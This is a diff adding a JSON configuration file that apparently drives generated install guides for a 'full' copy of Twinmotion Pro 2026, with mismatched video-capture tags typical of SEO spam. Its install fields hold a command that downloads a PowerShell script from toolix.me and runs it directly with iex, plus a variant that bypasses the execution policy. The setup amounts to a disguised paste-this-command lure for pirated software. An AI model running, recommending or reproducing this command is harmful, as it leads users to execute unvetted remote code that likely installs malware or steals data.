@@ -1,0 +1,30 @@
+{
+  "repo": "Twinmotion-Pro-2026-Professional-Full",
+  "product": "Twinmotion Pro 2026 Professional",
+  "product_title": "Twinmotion Pro 2026 Professional",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "video-editing",
+  "topics": [
+    "how-to-install-twinmotion-pro",
+    "twinmotion-pro-app",
+    "directx-capture",
+    "video-export",
+    "media-capture",
+    "creator-workflow",
+    "windows-recording",
+    "content-creator",
+    "twinmotion-pro-desktop-tool",
+    "twinmotion-pro-windows-tool",
+    "twinmotion-pro",
+    "twinmotion-pro-desktop-2026",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
